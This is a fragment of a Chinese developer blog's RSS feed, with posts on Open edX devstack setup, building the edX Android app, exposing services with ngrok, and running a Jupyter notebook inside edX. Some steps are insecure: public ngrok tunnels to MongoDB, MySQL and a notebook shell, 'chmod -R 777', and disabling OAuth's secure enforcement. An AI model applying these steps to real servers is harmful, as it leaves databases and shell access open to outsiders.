&lt;li&gt;&lt;a href="https://www.zhihu.com/question/36768514/answer/81937823"&gt;有没有必要把机器学习算法自己实现一遍？&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/22553761"&gt;如何简单形象又有趣地讲解神经网络是什么？&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;有趣的项目&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://fuzhii.com/2016/01/16/redmansions/"&gt;用机器学习的方法鉴别红楼梦作者&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.zhihu.com/question/36853910"&gt;GitHub 上有哪些有趣的关于 NLP 或者 DL 的项目&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;图像相关&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/google/deepdream"&gt;deepdream&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jcjohnson/neural-style"&gt;neural-style&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/alexjc/neural-doodle"&gt;neural-doodle&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;高性能平台&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/tensorflow/tensorflow"&gt;tensorflow&lt;/a&gt;&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/aymericdamien/TensorFlow-Examples"&gt;TensorFlow-Examples&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tflearn/tflearn"&gt;tflearn&lt;/a&gt;:Deep learning library featuring a higher-level API for TensorFlow&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/jtoy/awesome-tensorflow"&gt;awesome-tensorflow&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/tensorflow/skflow"&gt;skflow&lt;/a&gt;:Simplified interface for TensorFlow (mimicking Scikit Learn) for Deep Learning&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/Theano/Theano"&gt;Theano&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 16 Feb 2016 00:00:00 +0000</pubDate><guid>tag:,2016-02-16:machine-leanring-and-ai.html</guid><category>dev-tools</category></item><item><title>edx前端定制开发工作流</title><link>/edx-front-dev-workflow.html</link><description>&lt;p&gt;这篇文章重点理一下，前端开发的工作流，以便前端开发上手&lt;/p&gt;
&lt;h1&gt;环境搭建（devstack）&lt;/h1&gt;
&lt;p&gt;如果有以下有链接无法打开，应该是网络的问题，请保证能正常访问国外网络（你懂的）&lt;/p&gt;
&lt;h3&gt;软件安装&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;安装VirtualBox，&lt;code&gt;版本 &amp;gt;= 4.3.12&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;安装Vagrant，&lt;code&gt;版本&amp;gt;= 1.6.5&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;edx box下载&lt;/h3&gt;
&lt;p&gt;下载链接：&lt;a href="https://s3.amazonaws.com/edx-static/vagrant-images/20151221-dogwood-fullstack-rc2.box?torrent"&gt;vagrant-images_20151221-dogwood-fullstack-rc2.box&lt;/a&gt;，下载完毕后，得到文件：vagrant-images_20151221-dogwood-fullstack-rc2.box&lt;/p&gt;
&lt;h3&gt;box文件是什么鬼&lt;/h3&gt;
&lt;p&gt;之前忘了对背景知识做些介绍啦&lt;/p&gt;
&lt;p&gt;box文件是Vagrant使用的image（镜像）,用于在VirtualBox里构建虚拟操作系统。我们知道操作系统的镜像一般是iso文件，好比windows7的镜像文件windows_7_ultimate_x64.iso，所以可以把box看做相似的东西。&lt;/p&gt;
&lt;p&gt;我们知道VirtualBox是一款开源虚拟机软件，那么Vagrant又是什么呢，Vagrant可以看做是个配置工具，用于帮助创建、配置、管理虚拟机，帮助我们快速搭建开发环境，有了Vagrant，我们就不需要手动操作VirtualBox，只需要建立一个Vagrantfile，写好配置脚本就行！&lt;/p&gt;
&lt;p&gt;背景知识介绍到这里就差不多啦，如果你想进一步了解，可以自己去google搜索&lt;code&gt;Vagrant介绍&lt;/code&gt;、&lt;code&gt;VirtualBox介绍&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;构建环境&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;在命令行里执行：&lt;code&gt;vagrant box add fullstack vagrant-images_20151221-dogwood-fullstack-rc2.box&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;在本地新建文件Vagrantfile,内容如下&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Vagrant.require_version &amp;quot;&amp;gt;= 1.5.3&amp;quot;

VAGRANTFILE_API_VERSION = &amp;quot;2&amp;quot;

MEMORY = 4096
CPU_COUNT = 2


Vagrant.configure(VAGRANTFILE_API_VERSION) do |config|

  # Creates an edX fullstack VM from an official release
  config.vm.box     = &amp;quot;fullstack&amp;quot;

  config.vm.synced_folder  &amp;quot;.&amp;quot;, &amp;quot;/vagrant&amp;quot;, disabled: true
  config.ssh.insert_key = true

  config.vm.network :private_network, ip: &amp;quot;192.168.33.10&amp;quot;
  config.hostsupdater.aliases = [&amp;quot;preview.localhost&amp;quot;]

  config.vm.provider :virtualbox do |vb|
    vb.customize [&amp;quot;modifyvm&amp;quot;, :id, &amp;quot;--memory&amp;quot;, MEMORY.to_s]
    vb.customize [&amp;quot;modifyvm&amp;quot;, :id, &amp;quot;--cpus&amp;quot;, CPU_COUNT.to_s]

    # Allow DNS to work for Ubuntu 12.10 host
    # http://askubuntu.com/questions/238040/how-do-i-fix-name-service-for-vagrant-client
    vb.customize [&amp;quot;modifyvm&amp;quot;, :id, &amp;quot;--natdnshostresolver1&amp;quot;, &amp;quot;on&amp;quot;]
  end

end
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;在文件Vagrantfile所在目录下，执行&lt;code&gt;vagrant up&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;看看成果&lt;/h3&gt;
&lt;p&gt;以上步骤顺利完成后，访问&lt;code&gt;192.168.33.10&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;之后每次只需要进入到Vagrantfile文件所在目录，执行&lt;code&gt;vagrant up&lt;/code&gt;(启动虚拟机）、&lt;code&gt;vagrant halt&lt;/code&gt;(关闭虚拟机）就行啦&lt;/p&gt;
&lt;h1&gt;开发工作流&lt;/h1&gt;
&lt;p&gt;参考我之前写的&lt;a href="http://blog.just4fun.site/edx-front-dev.html"&gt;edx前端定制开发相关&lt;/a&gt;中&lt;code&gt;use map to debug scss&lt;/code&gt;之后的部分&lt;/p&gt;
&lt;p&gt;当然你也可以参考官方文档：&lt;a href="https://github.com/edx/configuration/wiki/edX-Developer-Stack"&gt;edX Developer Stack&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;如果你不想跳来跳去，我把重点都列出来：&lt;/p&gt;
&lt;h3&gt;工作流核心&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;搭建开发环境(参考上文)&lt;/li&gt;
&lt;li&gt;由于sass需要编译，所以你需要简单地使用命令行（很简单的）：使用putty登录服务器,下边列出一些常用命令&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;常用命令如下:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sudo /edx/bin/supervisorctl stop edxapp:&lt;/code&gt;（关闭无用的服务，提高开发速度）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;sudo  /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms runserver 0.0.0.0:5000 --settings devstack&lt;/code&gt; (启用开发服务器，记得将5000端口映射出去，注意这是一个常驻进程，需要一直占用这个窗口)&lt;/li&gt;
&lt;li&gt;&lt;pre&gt;
    sudo -H -u edxapp bash
    source /edx/app/edxapp/edxapp_env
    cd /edx/app/edxapp/edx-platform
    paver update_assets lms --debug --settings=aws
    # (生产map文件，方便调试scss)
  &lt;/pre&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;pre&gt;
    sudo -H -u edxapp bash
    source /edx/app/edxapp/edxapp_env
    cd /edx/app/edxapp/edx-platform
    paver update_assets lms --debug --settings=aws --watch
    #（实时观测scss文件的变化，每当变化自动编译为css，这是一个常驻进程，需要一直占用这个窗口）
   &lt;/pre&gt; &lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;在chrome里调试（参考&lt;a href="http://thesassway.com/intermediate/using-source-maps-with-sass"&gt;Using source maps with Sass 3.3&lt;/a&gt;）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;使用filezilla修改文件（filezilla可以在设置里指定你喜欢的编辑器作为默认编辑器），修改完成后，ctrl-s保存就会同步到服务器&lt;/li&gt;
&lt;li&gt;静态文件位于目录：&lt;code&gt;edx-platform/lms/static/sass/&lt;/code&gt;，开发是可以直接修改即可，如果能使用git来管理变更则最好&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;附录&lt;/h1&gt;
&lt;p&gt;当前open edx的前端排版主要用到&lt;a href="http://neat.bourbon.io/"&gt;Neat&lt;/a&gt;。.Neat是一个语义化的轻量级布局网格框架，构建在 Sass 和 Bourbon之上&lt;/p&gt;
&lt;p&gt;example看这里：&lt;a href="http://neat.bourbon.io/examples/"&gt;example&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;文档看这里:&lt;a href="http://thoughtbot.github.io/neat-docs/latest/"&gt;Neat-docs&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;open edx之后可能会有基于Susy和bootstrap的主题&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 15 Feb 2016 00:00:00 +0000</pubDate><guid>tag:,2016-02-15:edx-front-dev-workflow.html</guid><category>edx</category></item><item><title>编译edx安卓客户端</title><link>/build-edx-android-app.html</link><description>&lt;h1&gt;服务端&lt;/h1&gt;
&lt;p&gt;首先，登录到服务器，编辑&lt;code&gt;/edx/app/edxapp/lms.env.json&lt;/code&gt;,在FEATURES中添加&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;quot;ENABLE_MOBILE_REST_API&amp;quot;: true,
&amp;quot;ENABLE_OAUTH2_PROVIDER&amp;quot;: true,
&amp;quot;ENABLE_COMBINED_LOGIN_REGISTRATION&amp;quot;: true,
&amp;quot;OAUTH_ENFORCE_SECURE&amp;quot;: false,
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;接着，&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/mobile.html#create-the-oauth-clients"&gt;创建oauth client&lt;/a&gt;，将得到的OAUTH_CLIENT_ID给移动端&lt;/p&gt;
&lt;h1&gt;移动端&lt;/h1&gt;
&lt;h3&gt;环境依赖&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;gt;= java 7&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;SDK要求23&lt;/li&gt;
&lt;li&gt;Build Tools：23.0.2&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;开始编译&lt;/h3&gt;
&lt;p&gt;首先拉取项目，切换到相应分支:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#拉取edx-app-android&lt;/span&gt;
git clone https://github.com/edx/edx-app-android.git
&lt;span class="c1"&gt;#切换到named-release/dogwood分支&lt;/span&gt;
git checkout -b named-release/dogwood named-release/dogwood
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;接着修改配置文件&lt;code&gt;VideoLocker/default_config/config.yaml&lt;/code&gt;,填入你自己的服务器信息&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="l l-Scalar l-Scalar-Plain"&gt;API_HOST_URL&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://10.0.2.2&amp;#39;&lt;/span&gt; &lt;span class="c1"&gt;# localhost is 10.0.2.2 in Android&lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;ENVIRONMENT_DISPLAY_NAME&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;Localhost&amp;#39;&lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;PLATFORM_NAME&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;Your&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;platform&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;name&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;here&amp;#39;&lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;PLATFORM_DESTINATION_NAME&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;example.com&amp;#39;&lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;FEEDBACK_EMAIL_ADDRESS&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;support@example.com&amp;#39;&lt;/span&gt;
&lt;span class="l l-Scalar l-Scalar-Plain"&gt;COURSE_ENROLLMENT&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;ENABLED&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;true&lt;/span&gt;
    &lt;span class="l l-Scalar l-Scalar-Plain"&gt;EXTERNAL_COURSE_SEARCH_URL&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;#39;http://10.0.2.2/courses&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;将你的&lt;code&gt;OAUTH_CLIENT_ID&lt;/code&gt;填入&lt;code&gt;VideoLocker/default_config/local.yaml&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后使用 Android Studio或gradle来编译项目&lt;/p&gt;
&lt;h1&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://edx.readthedocs.org/projects/edx-installing-configuring-and-running/en/latest/mobile.html"&gt;Setting Up the Open edX Mobile Applications&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://github.com/edx/edx-app-android/tree/named-release/dogwood"&gt;edx-app-android&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://openedx.atlassian.net/wiki/display/MA/App+Configuration+Flags"&gt;App Configuration Flags&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 04 Feb 2016 00:00:00 +0000</pubDate><guid>tag:,2016-02-04:build-edx-android-app.html</guid><category>edx</category></item><item><title>ngrok在调试Open edX中的应用</title><link>/use-ngrok-in-open-edx.html</link><description>&lt;p&gt;在去年的一次黑客最喜欢的工具投票中，ngrok位列第五&lt;/p&gt;
&lt;h1&gt;&lt;a href="https://github.com/inconshreveable/ngrok"&gt;ngrok&lt;/a&gt;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;ngrok is a reverse proxy that creates a secure tunnel from a public endpoint to a locally running web service. ngrok captures and analyzes all traffic over the tunnel for later inspection and replay.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;关于ngrok我此前写过两篇文章：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/build-ngrok-server.html"&gt;搭建ngrok服务（内网穿透）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.just4fun.site/use-ngrok.html"&gt;ngrok使用笔记&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;查看数据库信息&lt;/h1&gt;
&lt;h3&gt;将mongo映射出去&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;./ngrok -config ./ngrok.cfg -proto=tcp 27017&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;ngrok会将本地端口映射到外网，就像这样：&lt;/p&gt;
&lt;p&gt;&lt;img alt="edx_ngrok0.png" src="img/edx/edx_ngrok/edx_ngrok0.png" /&gt;&lt;/p&gt;
&lt;p&gt;从中得到外网地址：xxx.xxx.xxx&lt;/p&gt;
&lt;p&gt;在本地输入：mongo xxx.xxx.xxx&lt;/p&gt;
&lt;p&gt;你就可以访问啦：&lt;/p&gt;
&lt;p&gt;&lt;img alt="edx_ngrok1.png" src="img/edx/edx_ngrok/edx_ngrok1.png" /&gt;&lt;/p&gt;
&lt;p&gt;或是使用rebomongo，不需要做任何配置&lt;/p&gt;
&lt;p&gt;&lt;img alt="edx_ngrok2.png" src="img/edx/edx_ngrok/edx_ngrok2.png" /&gt;&lt;/p&gt;
&lt;h3&gt;将mysql映射出去&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;./ngrok -config ./ngrok.cfg -proto=tcp 3306&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;mycli -h xxx.xxx.xxx -P xxx -u root&lt;/p&gt;
&lt;p&gt;&lt;img alt="edx_ngrok3.png" src="img/edx/edx_ngrok/edx_ngrok3.png" /&gt;&lt;/p&gt;
&lt;h3&gt;run devstack&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms runserver 0.0.0.0:5000 --settings devstack
./ngrok -config ./ngrok.cfg 5000
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;以上两条命令使用不同的tmux窗口打开&lt;/p&gt;
&lt;h3&gt;run IPython notebook&lt;/h3&gt;
&lt;p&gt;参考&lt;a href="http://blog.just4fun.site/dogwood-use-ipython-notebook.html"&gt;use ipython notebook in edx dogwood&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 02 Feb 2016 00:00:00 +0000</pubDate><guid>tag:,2016-02-02:use-ngrok-in-open-edx.html</guid><category>edx</category></item><item><title>use ipython notebook in edx dogwood</title><link>/dogwood-use-ipython-notebook.html</link><description>&lt;p&gt;今晚喝了一杯咖啡写完&lt;a href="http://blog.just4fun.site/edx-front-dev.html"&gt;edx前端开发相关&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;喝了一杯豆浆,写完了这篇&lt;/p&gt;
&lt;p&gt;哈哈，希望内容没有饮料那么湿&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;dogwood版本的django升级到了1.8.7,所以我们有一大波好用的Django工具可用啦！&lt;/p&gt;
&lt;h1&gt;安装依赖&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo /edx/bin/pip.edxapp install django-extensions
sudo /edx/bin/pip.edxapp install ipython&lt;span class="o"&gt;[&lt;/span&gt;notebook&lt;span class="o"&gt;]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h1&gt;修改devstack.py&lt;/h1&gt;
&lt;p&gt;在devstack.py末尾添加&lt;code&gt;INSTALLED_APPS += ("django_extensions",)&lt;/code&gt;,指令为：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sed -i '$a\INSTALLED_APPS += ("django_extensions",)' /edx/app/edxapp/edx-platform/lms/envs/devstack.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sed -i '$a\NOTEBOOK_ARGUMENTS = ["--no-browser","--ip","0.0.0.0"]' /edx/app/edxapp/edx-platform/lms/envs/devstack.py&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;另外&lt;code&gt;--notebook-dir /home/edx/notebook&lt;/code&gt;最好不要用，否则会因为path的问题带来困惑&lt;/p&gt;
&lt;p&gt;哈哈最近用sed用得很high，许多场景下都可以替代vim&lt;/p&gt;
&lt;h1&gt;run notebook&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;sudo /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms shell_plus --notebook --settings devstack&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img alt="edxbook5.jpg" src="img/edx/edxbook/edxbook5.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;哦对了，由于&lt;/p&gt;
&lt;h1&gt;映射到外网&lt;/h1&gt;
&lt;p&gt;使用ngrok把8888端口映射到外网&lt;/p&gt;
&lt;p&gt;&lt;code&gt;./ngrok -config ./ngrok.cfg -subdomain edxbook 8888&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后访问返回的网址即可&lt;/p&gt;
&lt;h1&gt;效果图&lt;/h1&gt;
&lt;p&gt;&lt;img alt="edxbook0.jpg" src="img/edx/edxbook/edxbook0.jpg" /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img alt="edxbook1.jpg" src="img/edx/edxbook/edxbook1.jpg" /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img alt="edxbook2.jpg" src="img/edx/edxbook/edxbook2.jpg" /&gt;&lt;/p&gt;
&lt;p&gt;开了它之后，我们几乎就不需要使用ssh了，所有操作都能在网页执行！！&lt;/p&gt;
&lt;p&gt;&lt;img alt="edxbook4.jpg" src="img/edx/edxbook/edxbook2.jpg" /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img alt="edxbook3.jpg" src="img/edx/edxbook/edxbook2.jpg" /&gt;&lt;/p&gt;
&lt;h1&gt;登录认证&lt;/h1&gt;
&lt;p&gt;处于安全考虑可以为网页设置密码，注意不用的使用应该终止notebook&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -u edxapp bash
&lt;span class="nb"&gt;source&lt;/span&gt; /edx/app/edxapp/
sudo chmod  -R &lt;span class="m"&gt;777&lt;/span&gt; /home/ubuntu/.jupyter/
jupyter notebook --generate-config
ipython
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在ipython里输入&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;notebook.auth&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;passwd&lt;/span&gt;
&lt;span class="n"&gt;passwd&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="c1"&gt;#输入密码&lt;/span&gt;
&lt;span class="c1"&gt;#得到输出 ：sha1:f086762ff47a:3d896aedd90dfb4d49cc4f40bb0eed2072exxxx&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;将其加到vim ~/.jupyter/jupyter_notebook_config.py&lt;/p&gt;
&lt;p&gt;&lt;code&gt;c.NotebookApp.password = u'sha1:67c9e60bb8b6:3d896aedd90dfb4d49cc4f40bb0eed2072exxxx'&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后重新跑
&lt;code&gt;sudo /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms shell_plus --notebook --settings devstack&lt;/code&gt;，就只有输对密码才能进入啦&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;查看类图&lt;/h1&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms graph_models courseware --s
ettings devstack  &amp;gt; courseware.dot 

&lt;span class="c1"&gt;#转化为png格式的图片&lt;/span&gt;
dot -Tpng courseware.dot &amp;gt; courseware.png

&lt;span class="c1"&gt;#查看整个edx的类结构&lt;/span&gt;
sudo /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms graph_models --settings devstack -a -g -o all.png
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;edx的整个类图如下，继承关系极其庞杂，图片很大就不贴过来了，有兴趣的小伙伴可以给我发邮件，我发给你&lt;/p&gt;
&lt;p&gt;截取局部&lt;/p&gt;
&lt;p&gt;&lt;img alt="edxbook6.jpg" src="img/edx/edxbook/edxbook6.jpg" /&gt;&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;以下是局部细节&lt;/p&gt;
&lt;p&gt;&lt;img alt="edxbook7.jpg" src="img/edx/edxbook/edxbook7.jpg" /&gt;&lt;/p&gt;
&lt;h1&gt;debugsqlshell&lt;/h1&gt;
&lt;p&gt;sudo -u www-data /edx/bin/python.edxapp /edx/app/edxapp/edx-platform/manage.py lms debugsqlshell --settings devstack&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.contrib.auth.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;User&lt;/span&gt;
&lt;span class="n"&gt;User&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这样我们就能看到orm真正执行的SQL语句，对调试帮助很大，当然你也可以借助&lt;a href="https://github.com/django-debug-toolbar/django-debug-toolbar"&gt;django-debug-toolbar&lt;/a&gt;来做到这点&lt;/p&gt;
&lt;p&gt;类似这样：&lt;/p&gt;
&lt;p&gt;&lt;img alt="edxbook8.jpg" src="img/edx/edxbook/edxbook8.jpg" /&gt;&lt;/p&gt;
&lt;h1&gt;后记&lt;/h1&gt;
&lt;p&gt;最近准备请小伙伴w帮忙折腾edx前端，w对前端十分熟悉，哈哈此处做膜拜状，对linux不算太熟（ps：linux这么丐帮的东西留给我等技术宅来就好啦）&lt;/p&gt;
&lt;p&gt;所以我想把服务器相关的部分对w屏蔽，使其专心在前端，准备通过fabric写好控制脚本，开启notebook，编译相关的工作保存成一个ipynb文件，只要回车就能执行！&lt;/p&gt;
&lt;p&gt;所有的工作就可以在web端完成啦。&lt;/p&gt;
&lt;p&gt;大工基本告成，好想找一群人来演示，以满足装x的需求 233&lt;/p&gt;
&lt;hr /&gt;
&lt;h1&gt;补遗&lt;/h1&gt;
&lt;h3&gt;20160222&lt;/h3&gt;
&lt;p&gt;按照以上方式配置好后，即便在其他环境里安装jupyter(pip install )，django Shell-Plus环境也生效&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 28 Jan 2016 00:00:00 +0000</pubDate><guid>tag:,2016-01-28:dogwood-use-ipython-notebook.html</guid><category>edx</category></item><item><title>edx前端定制开发相关</title><link>/edx-front-dev.html</link><description>&lt;p&gt;上周末去了趟内蒙古师范大学，他们在Open edX前端所做的工作令人震惊，不仅效果惊人，让你看不出这是一个edx系统，而且采用的方法也十分聪明，完全可以去今年在斯坦福举办的Open edX第三届会议上与大家分享。&lt;/p&gt;
&lt;p&gt;这段时间我在考虑Open edX的前端相关的工作流和最佳实践，整理出来与大家分享和讨论&lt;/p&gt;
&lt;hr /&gt;
&lt;h3&gt;历史回顾&lt;/h3&gt;
&lt;p&gt;关于Open edX前端开发，此前主要有两类做法&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;直接侵入修改scss和template&lt;/li&gt;
&lt;li&gt;采用theme机制，例子有：&lt;ul&gt;
&lt;li&gt;斯坦福大学贡献的&lt;a href="https://github.com/Stanford-Online/edx-theme"&gt;Stanford-Online/edx-theme&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;IONISx公司贡献的&lt;a href="https://github.com/IONISx/edx-theme"&gt;IONISx/edx-theme&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;来自法国的&lt;a href="https://github.com/openfun/edx-theme"&gt;openfun/edx-theme&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;估计以上的这些，对新手而言，看的云里雾里了。看不懂历史是好事呢，说明没有历史负担。&lt;/p&gt;
&lt;p&gt;在edx发布了dogwood版本之后，我们就不要这么折腾啦。&lt;/p&gt;
&lt;p&gt;新版本前端定制相关的工作，有内置的主题机制。只要保证主题包的目录结构和静态文件目录结构相同，主题包下的同名文件就会覆盖原始文件。这样修改前端界面就是全面且非侵入式的了。&lt;/p&gt;
&lt;p&gt;如果你有修改theme的经验，那么对当前的theme机制应该手到擒来，修改过程几乎一样，当然命名规则有些调整，具体参考&lt;a href="https://github.com/edx/edx-platform/blob/named-release/dogwood.rc/themes/README.rst"&gt;Comprehensive Theming&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;并且theme同时支持lms和cms！&lt;/p&gt;
